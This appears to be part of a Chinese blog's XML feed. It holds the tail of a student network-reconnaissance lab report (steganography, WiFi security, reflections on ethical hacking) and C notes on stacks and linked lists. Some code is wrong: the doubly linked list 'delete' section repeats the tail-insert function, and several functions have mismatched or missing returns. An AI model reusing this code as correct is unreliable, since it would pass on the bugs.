src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-1-3.jpg"></p><h4 id="8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。"><a href="#8-2-笑脸背后的阴霾：图片smile有什么隐藏信息。" class="headerlink" title="8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。"></a>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。</h4><p>回答：隐藏信息为tom is the kille-.</p><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/8-2-1.png"></p><h4 id="8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"><a href="#8-3-尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。" class="headerlink" title="8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。"></a>8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</h4><p> 回答：下载一定的软件即可恢复</p><h3 id="9、讨论学校热点GUET-WiFi的安全问题，以截图说明。"><a href="#9、讨论学校热点GUET-WiFi的安全问题，以截图说明。" class="headerlink" title="9、讨论学校热点GUET-WiFi的安全问题，以截图说明。"></a>9、讨论学校热点GUET-WiFi的安全问题，以截图说明。</h3><p><img src="/../images/%E5%AE%9E%E9%AA%8C1-%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E5%AF%9F.assets/12.png"></p><h3 id="10、实验小结"><a href="#10、实验小结" class="headerlink" title="10、实验小结"></a>10、实验小结</h3><p><strong>实验报告小结需要描述Ethical Hacking的理解</strong>。</p><p>我对Ethical Hacking的理解：我对道德黑客的理解是指通过授权且合法的方式，以保护和提升网络安全为目标的技术活动。道德黑客是一群具备专业知识和技能的安全专家，他们通过模拟攻击和漏洞测试来评估系统和网络的安全性。他们的主要目的是发现潜在的安全风险，并向组织提供建议和解决方案来增强其安全性。</p><p>道德黑客与恶意黑客有着明显的区别，他们严格遵守法律和道德准则，并通过与组织合作的方式来执行其任务。他们的活动是经过授权的，通常在组织的请求下进行，以保护系统免受潜在的攻击和数据泄露。</p><p>道德黑客的工作范围包括对网络、应用程序和系统进行漏洞扫描、渗透测试、安全评估等活动。他们利用类似黑客攻击的技术手段来发现漏洞，然后向组织报告这些漏洞以及相应的修复建议。</p><p>总而言之，道德黑客的目标是通过帮助组织发现并修复安全漏洞，提高网络和系统的安全性，从而保护用户的数据和隐私。他们在维护网络安全方面发挥着重要的作用。</p><p>1.向网络上传个人照片时，若不想暴露个人位置，需要对照片的关键信息打上马赛克。</p><p>2.通过LAC码和CID码，可以初步确定手机用户的位置，所以自己手机的LAC和CID码不应该随便让其他人知道。</p><p>3.利用一定软件可以进行编码解码。注意：如果数据的字节数不是3的倍数，则其位数就不是6的倍数，那么就不能精确地划分成6位的块。需在原数据后面添加1个或2个零值字节，使其字节数是3的倍数。</p><p>4.当文件打不开时，可以利用winhex进行修复</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 网络渗透测试 </category>
          
          <category> 实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈</title>
      <link href="/2023/12/08/%E6%A0%88/"/>
      <url>/2023/12/08/%E6%A0%88/</url>
      
        <content type="html"><![CDATA[<h1 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">PNode</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> * <span class="title">top</span>, * <span class="title">LinkStack</span>;</span></span><br></pre></td></tr></table></figure><h1 id="创建空栈"><a href="#创建空栈" class="headerlink" title="创建空栈"></a>创建空栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkStack <span class="title function_">SetNullStack_link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LinkStack top=(LinkStack)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line"><span class="keyword">if</span>(top!=<span class="literal">NULL</span>) top-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;创建空栈失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="判空"><a href="#判空" class="headerlink" title="判空"></a>判空</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">IsNullStack_Link</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(top-&gt;next==<span class="literal">NULL</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="进栈"><a href="#进栈" class="headerlink" title="进栈"></a>进栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Push_link</span><span class="params">(LinkStack top,<span class="type">int</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p;</span><br><span class="line">p=(PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line"><span class="keyword">if</span>(p==<span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;进栈创建失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;data=x;</span><br><span class="line">p-&gt;next=top-&gt;next;</span><br><span class="line">top-&gt;next=p;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="取栈顶"><a href="#取栈顶" class="headerlink" title="取栈顶"></a>取栈顶</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">Top_link</span><span class="params">(LinkStack top)</span></span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(IsNullStack_Link(top)) <span class="built_in">printf</span>(<span class="string">&quot;此栈为空\n&quot;</span>);</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> top-&gt;next-&gt;data;</span><br><span class="line"> &#125; </span><br></pre></td></tr></table></figure><h1 id="出栈"><a href="#出栈" class="headerlink" title="出栈"></a>出栈</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Pop_link</span><span class="params">(LinkStack top)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p;</span><br><span class="line"><span class="keyword">if</span>(IsNullStack_Link(top)) <span class="built_in">printf</span>(<span class="string">&quot;此栈为空\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p=top-&gt;next;</span><br><span class="line">top-&gt;next=p-&gt;next;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表</title>
      <link href="/2023/12/08/%E9%93%BE%E8%A1%A8/"/>
      <url>/2023/12/08/%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h1><h2 id="类型定义"><a href="#类型定义" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> DataType;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">DataType data;   <span class="comment">//数据域 </span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span>   <span class="comment">//指针域 </span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span>  <span class="comment">//节点类型定义 </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span>  <span class="comment">//单链表类型定义 </span></span><br></pre></td></tr></table></figure><h2 id="创建链表"><a href="#创建链表" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetNullList_Link</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">    LinkList head = (LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    <span class="keyword">if</span> (head != <span class="literal">NULL</span>) head-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;alloc failure&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> head; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Head</span><span class="params">(<span class="keyword">struct</span> Node* head)</span>   <span class="comment">//用头插法创建单链表 </span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=<span class="literal">NULL</span>;   <span class="comment">//临时使用 </span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; 头插法，请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node)); <span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;  <span class="comment">//对数据域赋值 </span></span><br><span class="line">p -&gt;next = head -&gt;next;  <span class="comment">//对next域赋值 </span></span><br><span class="line">head -&gt; next =p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">CreateList_Tail</span><span class="params">(<span class="keyword">struct</span> Node* head)</span><span class="comment">//用尾插法建立链表 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">p</span>=</span><span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">q</span>=</span>head;</span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;尾插法， 请输入整形数据建立链表，以 -1 结束\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data); </span><br><span class="line"><span class="keyword">while</span>(data!=<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">p=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));<span class="comment">//分配空间 </span></span><br><span class="line">p -&gt; data=data;<span class="comment">//数据域赋值 </span></span><br><span class="line">p -&gt;next =<span class="literal">NULL</span>;<span class="comment">//指针域赋值 </span></span><br><span class="line">q -&gt;next =p;</span><br><span class="line">q=p;</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="输出链表"><a href="#输出链表" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">print</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode p=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(p)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,p -&gt; data);</span><br><span class="line">p=p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="插入算法"><a href="#插入算法" class="headerlink" title="插入算法"></a><strong>插入算法</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//其中 llist是操作的链表，x是待插入元素y的前驱节点元素，y是待插入的元素</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">InsertPost_link</span><span class="params">(LinkList llist,DataType x,DataType y)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p =llist;</span><br><span class="line">    PNode Newp=(PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    Newp -&gt; data=y;</span><br><span class="line">    Newp -&gt; next =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (p -&gt; data==x)</span><br><span class="line">        &#123;</span><br><span class="line">            Newp -&gt; next=p -&gt; next;</span><br><span class="line">            p -&gt;next =Newp;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            p=p -&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;not exist data %d\n&quot;</span>,x);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除算法"><a href="#删除算法" class="headerlink" title="删除算法"></a>删除算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DelNode_Link</span><span class="params">(LinkList head,<span class="type">int</span> deldata)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(head==<span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">PNode prees=head;</span><br><span class="line">PNode current=head -&gt; next;</span><br><span class="line"><span class="keyword">while</span>(current)&#123;</span><br><span class="line"><span class="keyword">if</span>(current -&gt; data == deldata)</span><br><span class="line">&#123;</span><br><span class="line">prees -&gt; next = current -&gt; next;</span><br><span class="line"><span class="built_in">free</span>(current);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">prees=current;</span><br><span class="line">current=current -&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;not exist %d\n&quot;</span>,deldata);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将尾结点连接到头结点</span></span><br><span class="line"></span><br><span class="line">PNode <span class="title function_">buildCircularLinkedList</span><span class="params">(<span class="type">int</span> n, PNode tail)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode current=<span class="literal">NULL</span>, prev;</span><br><span class="line">    prev = tail; </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        current = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        current-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;current-&gt;data);</span><br><span class="line">        prev-&gt;next = current;</span><br><span class="line">        prev = current;</span><br><span class="line">    &#125;</span><br><span class="line">    current-&gt;next = tail-&gt;next;</span><br><span class="line">    tail-&gt;next = current;</span><br><span class="line">    <span class="keyword">return</span> tail;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h1><h2 id="类型定义-1"><a href="#类型定义-1" class="headerlink" title="类型定义"></a>类型定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line"><span class="type">int</span> data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">pre</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">LinkList</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">PNode</span>;</span></span><br></pre></td></tr></table></figure><h2 id="创建链表-1"><a href="#创建链表-1" class="headerlink" title="创建链表"></a>创建链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LinkList <span class="title function_">SetList_Link</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList head=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">head-&gt;data=<span class="number">0</span>;</span><br><span class="line">head-&gt;pre=<span class="literal">NULL</span>;</span><br><span class="line">head-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="头插法-1"><a href="#头插法-1" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">HeadInsert</span><span class="params">(LinkList head,<span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">   newNode-&gt;data = data;</span><br><span class="line">   newNode-&gt;pre = head;</span><br><span class="line">   newNode-&gt;next = head-&gt;next;</span><br><span class="line">   <span class="keyword">if</span>(head-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      head-&gt;next-&gt;pre = newNode;</span><br><span class="line">   &#125;</span><br><span class="line">   head-&gt;next = newNode;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="尾插法-1"><a href="#尾插法-1" class="headerlink" title="尾插法"></a>尾插法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="输出链表-1"><a href="#输出链表-1" class="headerlink" title="输出链表"></a>输出链表</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(LinkList head)</span></span><br><span class="line">&#123;</span><br><span class="line">LinkList PrintList=head-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(PrintList)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d-&gt;&quot;</span>,PrintList-&gt;data);</span><br><span class="line">PrintList=PrintList-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">TailInsert</span><span class="params">(LinkList head, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data = data;</span><br><span class="line">    newNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PNode p = head;</span><br><span class="line">    <span class="keyword">while</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    newNode-&gt;pre = p;</span><br><span class="line">    p-&gt;next = newNode;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="插入算法-1"><a href="#插入算法-1" class="headerlink" title="插入算法"></a>插入算法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">InsertAfterElement</span><span class="params">(LinkList head, <span class="type">int</span> target, <span class="type">int</span> data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PNode p = head-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;data == target) &#123;</span><br><span class="line">            PNode newNode = (PNode)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line"></span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (p-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                p-&gt;next-&gt;pre = newNode;</span><br><span class="line">            &#125;</span><br><span class="line">            newNode-&gt;pre = p;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line"></span><br><span class="line">            head-&gt;data++;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    